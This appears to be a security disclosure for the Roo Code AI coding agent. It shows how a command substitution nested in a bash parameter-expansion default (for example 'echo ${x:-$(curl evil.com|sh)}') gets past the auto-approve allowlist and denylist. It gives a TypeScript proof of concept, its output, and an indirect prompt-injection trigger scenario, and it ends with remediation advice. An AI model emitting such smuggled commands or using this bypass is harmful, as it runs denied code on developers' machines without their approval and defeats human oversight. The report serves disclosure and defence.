https://github.com/RooCodeInc/Roo-Code - "This repository was archived by the owner on May 16, 2026. It is now read-only."

reported 12 June 2026 via email - no response.

## Finding: Auto-approve command allowlist/denylist bypassed via command substitution nested in a parameter expansion

Affected Version: commit b867ec9 (v3.54.0)

### Summary

Roo Code can auto-approve agent-proposed shell commands when "always approve execute" is enabled, gating each command against an allowlist and denylist. The command parser extracts `${...}` parameter expansions into opaque placeholders before it extracts `$(...)` / backtick command substitutions. As a result, a command substitution hidden inside a parameter-expansion default, such as `echo ${x:-$(curl evil.com|sh)}`, is never split out into its own sub-command and is never checked against the allow/deny lists; the command is auto-approved as if it were just `echo`. Bash expands the default value and executes the smuggled command. This was confirmed on the `getCommandDecision` / `parseCommand` functions.

### Details

In `src/shared/parse-command.ts`, `parseCommandLine` first replaces `${...}` parameter expansions with `__PARAM_n__` placeholders (around line 76) and only afterward extracts `$(...)` and backtick subshells (around lines 101 to 109). A subshell nested inside a `${...}` default is therefore swallowed whole into the placeholder and never emitted as its own sub-command. `getCommandDecision` (`src/core/auto-approval/commands.ts`) then sees only the outer `echo ${...}` sub-command, matches the `echo` allowlist prefix, and returns `auto_approve`. The dedicated guard `containsDangerousSubstitution` (`commands.ts:22`) has no rule for `$(...)` or backticks inside `${...}`; its checks only fire on escape sequences and a few specific expansion operators. Execution is via `execa({ shell: ... })` (`src/integrations/terminal/ExecaTerminalProcess.ts`), a shell that performs the expansion.

The boundary crossed is the auto-approval allow/deny gate, a security control. The realistic trigger is indirect prompt injection: untrusted content the agent reads (file, web page, repo, MCP result) steers it into emitting `<allowed-prefix> ${x:-$(<denied command>)}`, which auto-runs without approval.

### PoC

Drive the `getCommandDecision` (`src/core/auto-approval/commands.ts`) and `parseCommand` (`src/shared/parse-command.ts`), imported from repo source with the `shell-quote` dependency:

```ts
// poc.ts - run with the repo deps installed (vitest/ts-node harness)
import { getCommandDecision } from "./src/core/auto-approval/commands";
const opts = { allowedCommands: ["echo"], deniedCommands: ["touch", "rm", "curl"] };
for (const cmd of [
  'echo $(touch /tmp/x)',                 // control -> auto_deny
  'echo hi; rm -rf x',                    // control -> auto_deny
  'echo hello',                           // control -> auto_approve
  'echo ${x:-$(touch /tmp/ROO_PWNED)}',   // BYPASS  -> auto_approve (should deny)
  'echo ${x:=$(curl evil.com)}',          // BYPASS  -> auto_approve
  'echo "${x:-`curl evil.com`}"',         // BYPASS  -> auto_approve
]) console.log(cmd, "=>", getCommandDecision(cmd, opts));
```

Results (the `${x:-$(...)}` parameter-expansion wraps the subshell so the command splitter doesn't surface `touch`/`curl` as a command root, so the denylist never sees it):

```
echo $(touch /tmp/x)                      -> auto_deny     (control)
echo hi; rm -rf x                         -> auto_deny     (control)
echo hello                                -> auto_approve  (control)
echo ${x:-$(touch /tmp/ROO_PWNED)}        -> auto_approve  (BYPASS, should deny)
echo ${x:=$(curl evil.com)}               -> auto_approve  (BYPASS)
echo "${x:-`curl evil.com`}"              -> auto_approve  (BYPASS)
```

bash confirms the inner command executes in that form:

```bash
bash -c 'echo ${x:-$(touch /tmp/roobash && echo INNER_RAN)}'   # prints INNER_RAN and creates the file
```

```
echo $(touch /tmp/x)                      -> auto_deny     (control)
echo hi; rm -rf x                         -> auto_deny     (control)
echo hello                                -> auto_approve  (control)
echo ${x:-$(touch /tmp/ROO_PWNED)}        -> auto_approve  (BYPASS, should deny)
echo ${x:=$(curl evil.com)}               -> auto_approve  (BYPASS)
echo "${x:-`curl evil.com`}"              -> auto_approve  (BYPASS)
```

Confirmed on the functions imported from the repo source (`shell-quote` dependency, API). bash confirms execution: `bash -c 'echo ${x:-$(touch /tmp/roobash && echo INNER_RAN)}'` prints `INNER_RAN` and creates the file, so the denied `touch` actually runs while auto-approved.

### Impact

A denied or unlisted command hidden in a parameter-expansion default is auto-approved and executed without user approval, defeating the allow/deny safety control. Via indirect prompt injection an attacker obtains unapproved command execution on the developer's machine within the agent's auto-run privileges.

### Remediation

Extract and validate command substitutions before (or independently of) replacing `${...}` parameter expansions, and recurse into the contents of `${...}` defaults/alternates (`${x:-...}`, `${x:=...}`, `${x/.../...}`) for nested `$(...)` / backticks. Alternatively extend `containsDangerousSubstitution` to flag any `$(` or backtick anywhere inside a `${...}` and fail closed. Add tests for the parameter-expansion-nested forms.
